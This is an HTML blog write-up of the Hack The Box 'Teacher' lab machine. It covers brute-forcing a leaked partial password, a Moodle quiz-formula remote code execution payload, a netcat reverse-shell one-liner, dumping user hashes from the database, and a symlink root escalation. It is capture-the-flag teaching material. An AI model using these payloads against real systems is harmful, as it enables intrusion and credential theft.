&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;for-img-srcimages5png-there-is-an-onerror-attribute-to-print-thats-an-f-in-the-console-so-i-checked-the-console-&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;images/5.png&quot;&amp;gt;&lt;/code&gt; there is an &lt;code class=&quot;highlighter-rouge&quot;&gt;onerror&lt;/code&gt; attribute to print &lt;code class=&quot;highlighter-rouge&quot;&gt;That's an F&lt;/code&gt; in the console. So I checked the console :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;weird-lets-check-that-image-httpteacherhtbimages5png-&quot;&gt;Weird let’s check that image. &lt;code class=&quot;highlighter-rouge&quot;&gt;http://teacher.htb/images/5.png&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;corrupted-file--lets-check-if-its-really-a-corrupted-image-or-its-not-an-image-at-all-&quot;&gt;Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://teacher.htb/images/5.png&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.                                                 

Could you guys figure out what the last charachter is, or just reset it?                                                                   

Thanks,
Giovanni
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nice--we-have-a-username-and-a-password-but-we-still-need-to-figure-out-the-last-character-but-where-will-we-use-these-credentials-anyway--i-ran-gobuster-with-usrsharewordlistsdirbusterdirectory-list-23-mediumtxt-in-the-background-and-got-some-results--one-of-them-was-moodle&quot;&gt;Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; in the background and got some results , one of them was &lt;code class=&quot;highlighter-rouge&quot;&gt;/moodle&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://teacher.htb/moodle&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License  -&lt;a href=&quot;https://en.wikipedia.org/wiki/Moodle&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;on-the-login-page-theres-a-guest-login-&quot;&gt;On the login page there’s a guest login :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-i-couldnt-achieve-anything-from-that-guest-login&quot;&gt;However I couldn’t achieve anything from that guest login.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bruteforcing-the-last-character&quot;&gt;Bruteforcing the last character&lt;/h3&gt;
&lt;h4 id=&quot;we-have-the-credentials-but-we-need-to-figure-out-the-last-character-of-the-password-i-created-a-list-of-numbers--letters-and-special-chars-and-printed-them-next-to-the-password&quot;&gt;We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password.&lt;/h4&gt;
&lt;h4 id=&quot;for-i-in-az-do-echo-th4c00ltheachai-done--listtxt-this-will-print-all-the-letters-next-to-th4c00ltheacha&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;for i in {a..z}; do echo Th4C00lTheacha$i; done &amp;gt; list.txt&lt;/code&gt; this will print all the letters next to &lt;code class=&quot;highlighter-rouge&quot;&gt;Th4C00lTheacha&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-i-added-some-special-chars-manually-like-_--and-finally-i-added-numbers--for-i-in-09-do-echo-th4c00ltheachai-done--listtxt&quot;&gt;Then I added some special chars manually like &lt;code class=&quot;highlighter-rouge&quot;&gt;!@#$%^&amp;amp;*()_-+=.?/\&lt;/code&gt; and finally I added numbers : &lt;code class=&quot;highlighter-rouge&quot;&gt;for i in {0..9}; do echo Th4C00lTheacha$i; done &amp;gt;&amp;gt; list.txt&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;listtxt-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;list.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Th4C00lTheachaa
Th4C00lTheachab
Th4C00lTheachac
Th4C00lTheachad
Th4C00lTheachae
Th4C00lTheachaf
Th4C00lTheachag
Th4C00lTheachah
Th4C00lTheachai
Th4C00lTheachaj
Th4C00lTheachak
Th4C00lTheachal
Th4C00lTheacham
Th4C00lTheachan
Th4C00lTheachao
Th4C00lTheachap
Th4C00lTheachaq
Th4C00lTheachar
Th4C00lTheachas
Th4C00lTheachat
Th4C00lTheachau
Th4C00lTheachav
Th4C00lTheachaw
Th4C00lTheachax
Th4C00lTheachay
Th4C00lTheachaz
Th4C00lTheacha!
Th4C00lTheacha@
Th4C00lTheacha#
Th4C00lTheacha$
Th4C00lTheacha%
Th4C00lTheacha^
Th4C00lTheacha&amp;amp;
Th4C00lTheacha*
Th4C00lTheacha(
Th4C00lTheacha)
Th4C00lTheacha_
Th4C00lTheacha-
Th4C00lTheacha+
Th4C00lTheacha=
Th4C00lTheacha.
Th4C00lTheacha?
Th4C00lTheacha/
Th4C00lTheacha\
Th4C00lTheacha0
Th4C00lTheacha1
Th4C00lTheacha2
Th4C00lTheacha3
Th4C00lTheacha4
Th4C00lTheacha5
Th4C00lTheacha6
Th4C00lTheacha7
Th4C00lTheacha8
Th4C00lTheacha9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;since-its-a-small-list--i-used-burp-intruder-to-bruteforce-the-password-lets-intercept-the-request-and-send-it-to-intruder-&quot;&gt;Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/teacher/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/teacher/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-its-finished--all-the-responses-were-870-bytes-in-length-except-the-response-of-the-payload-th4c00ltheacha&quot;&gt;After it’s finished , all the responses were 870 bytes in length except the response of the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;Th4C00lTheacha#&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-probably-this-is-the-right-password--lets-check&quot;&gt;So probably this is the right password , let’s check.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-now-we-are-in-as-giovanni&quot;&gt;It worked and now we are in as &lt;code class=&quot;highlighter-rouge&quot;&gt;Giovanni&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce--initial-shell-as-www-data&quot;&gt;RCE , Initial Shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;after-some-enumeration-i-didnt-find-anything-interesting--so-i-searched-on-google-and-found-this-article-lets-try-to-reproduce-that-vulnerability&quot;&gt;After some enumeration I didn’t find anything interesting , so I searched on Google and found this &lt;a href=&quot;https://blog.ripstech.com/2018/moodle-remote-code-execution/&quot;&gt;article&lt;/a&gt;. Let’s try to reproduce that vulnerability.&lt;/h4&gt;
&lt;h4 id=&quot;first--we-will-go-to-the-algebra-course-&quot;&gt;First , we will go to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Algebra&lt;/code&gt; course :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-turn-editing-on-&quot;&gt;Then we will turn editing on :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-edit-the-course--so-we-will-choose-any-topic-and-click-on-add-an-activity-or-resource-and-we-will-choose-quiz-&quot;&gt;Now we can edit the course , so we will choose any topic and click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Add an activity or resource&lt;/code&gt; and we will choose &lt;code class=&quot;highlighter-rouge&quot;&gt;Quiz&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-just-fill-in-the-required-information-&quot;&gt;Then we will just fill in the required information :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-click-on-save-and-display&quot;&gt;And click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Save and display&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-will-click-on-edit-quiz-&quot;&gt;After that we will click on &lt;code class=&quot;highlighter-rouge&quot;&gt;edit quiz&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-add-a-new-question-question-type-will-be-calculated-&quot;&gt;And add a new question. Question type will be &lt;code class=&quot;highlighter-rouge&quot;&gt;Calculated&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/teacher/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;again-we-will-fill-in-the-required-information-&quot;&gt;Again we will fill in the required information :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-reach-the-actual-exploitation--we-will-set-the-answer-formula-to-&quot;&gt;And finally we reach the actual exploitation , we will set the answer formula to :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*{a*/`$_GET[0]`;//{x}}`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-will-allow-us-to-pass-system-commands-through-a-url-parameter-called-0--more-info-about-how-the-exploit-is-working-can-be-found-in-the-previously-mentioned-article&quot;&gt;This will allow us to pass system commands through a url parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; , More info about how the exploit is working can be found in the previously mentioned article.&lt;/h4&gt;
&lt;h4 id=&quot;after-saving-the-changes-we-will-get-this-page-&quot;&gt;After saving the changes we will get this page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-click-on-next-page-to-finally-get-to-the-vulnerable-page-&quot;&gt;We will click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Next Page&lt;/code&gt; to finally get to the vulnerable page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-add-the-parameter-0-and-get-a-reverse-shell-&quot;&gt;Let’s add the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and get a reverse shell :&lt;/h4&gt;
&lt;h4 id=&quot;shell--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-ip-port-tmpf&quot;&gt;Shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--the-payload-is-url-encoded-so-final-payload-will-be--0rmtmpf3bmkfifotmpf3bcattmpfbinsh-i2261ncipporttmpf&quot;&gt;Note : the payload is url encoded. So final payload will be : &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+ip+port+&amp;gt;/tmp/f&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-sending-the-request--our-listener-gets-a-callback-and-we-get-a-reverse-shell-as-www-data-&quot;&gt;After sending the request , our listener gets a callback. And we get a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-only-giovanni-on-the-box-and-we-cant-access-his-home-directory-as-www-data&quot;&gt;There is only &lt;code class=&quot;highlighter-rouge&quot;&gt;giovanni&lt;/code&gt; on the box and we can’t access his &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;hardcoded-database-credentials--privilege-escalation-to-giovanni&quot;&gt;Hardcoded Database Credentials , Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;giovanni&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;back-to-varwwwhtmlmoodle--i-wanted-to-check-config-files-and-other-stuff-to-see-if-there-are-any-information-that-can-help-and-in-configphp-i-found-database-credentials-&quot;&gt;Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/moodle&lt;/code&gt; , I wanted to check config files and other stuff to see if there are any information that can help. And in &lt;code class=&quot;highlighter-rouge&quot;&gt;config.php&lt;/code&gt; I found database credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;sweet--lets-see-whats-in-there&quot;&gt;Sweet , Let’s see what’s in there.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mysql -h 127.0.0.1 -u root -p&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-not-in-any-database-none--lets-list-the-databases-&quot;&gt;We are not in any database &lt;code class=&quot;highlighter-rouge&quot;&gt;[(none)]&lt;/code&gt; , Let’s list the databases :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SHOW DATABASES;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;moodle-is-interesting-and-might-have-some-passwords&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;moodle&lt;/code&gt; is interesting and might have some passwords.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;USE moodle;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-lets-check-the-tables-&quot;&gt;Now let’s check the tables :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SHOW TABLES;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;a-lot-of-tables--but-an-interesting-one-is-called-mdl_user-&quot;&gt;A lot of tables , but an interesting one is called &lt;code class=&quot;highlighter-rouge&quot;&gt;mdl_user&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;alright--lets-see-whats-in-that-table-&quot;&gt;Alright , let’s see what’s in that table :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * from mdl_user;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-didnt-get-the-best-output-d-but-anyway-i-looked-into-it-and-found-this-md5-hash-&quot;&gt;We didn’t get the best output :D but anyway I looked into it and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-name-is-giovannibak--probably-a-backup-for-giovannis-password-crackstation-was-able-to-crack-it-&quot;&gt;And its name is &lt;code class=&quot;highlighter-rouge&quot;&gt;Giovannibak&lt;/code&gt; , probably a backup for giovanni’s password. &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; was able to crack it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-expelled-we-can-su-to-giovanni&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;expelled&lt;/code&gt;, we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;giovanni&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-own-user&quot;&gt;Now we own user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;777-ability-to-read--write-and-execute-anything-on-the-system&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;777&lt;/code&gt;. Ability to read , write and execute anything on the system&lt;/h3&gt;
&lt;h4 id=&quot;in-giovannis-home-directory-there-is-a-directory-called-work-which-has-two-directories-courses-and-tmp-nothing-special&quot;&gt;In giovanni’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory there is a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;work&lt;/code&gt; which has two directories &lt;code class=&quot;highlighter-rouge&quot;&gt;courses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tmp&lt;/code&gt;. Nothing Special.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/40.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/teacher/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-a-lot-of-enumeration-i-found-in-usrbin-a-script-called-backupsh-&quot;&gt;After a lot of enumeration I found in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/42.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/teacher/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-really-care-about-the-tar-commands--what-we-care-about-is-that-its-changing-current-directory-to-homegiovanniwork-then-changes-it-once-again-to-homegiovanniworktmp-then-changes-permissions-to-777-recursively-this-means-that-any-user-can-read--write-and-execute-any-file-in-homegiovanniworktmp-so-if-we-created-a-symlink-for-root-in-homegiovanniworktmp-and-wait-for-the-script-to-get-executed-by-root-cronjob-we-will-have-access-to-root-in-normal-conditions-creating-a-symlink-to-root-wont-let-you-have-access-to-it-if-you-dont-have-the-permissions-to-because-its-still-linking-to-a-directory-that-you-are-not-authorized-to-access-but-since-the-script-runs-chmod-777-on-homegiovanniworktmp-recursively-anyone-has-access-to-whats-in-there-even-symlinks-this-article-explains-it-very-well-read-this-if-you-dont-know-whats-a-symlink&quot;&gt;We don’t really care about the &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; commands , What we care about is that it’s changing current directory to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work&lt;/code&gt; then changes it once again to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt; then changes permissions to &lt;code class=&quot;highlighter-rouge&quot;&gt;777&lt;/code&gt; recursively. This means that any user can read , write and execute any file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt;. So if we created a symlink for &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt; and wait for the script to get executed by root (cronjob) we will have access to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt;. In normal conditions creating a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 777&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt; recursively, Anyone has access to what’s in there even symlinks. This &lt;a href=&quot;https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/&quot;&gt;article&lt;/a&gt; explains it very well. Read &lt;a href=&quot;https://stackabuse.com/symbolic-links-in-unix-linux/&quot;&gt;this&lt;/a&gt; if you don’t know what’s a symlink.&lt;/h4&gt;
&lt;h4 id=&quot;alright--lets-create-a-symlink-for-root-in-homegiovanniworktmp&quot;&gt;Alright , Let’s create a symlink for &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ln -s /root ./tmp&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/teacher/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---redcross&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/redcross/&quot;&gt;Hack The Box - RedCross&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><summary type="html">Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &amp;lt;img src=&quot;images/5.png&quot;&amp;gt; there is an onerror attribute to print That's an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &amp;gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &amp;gt;&amp;gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp;amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni 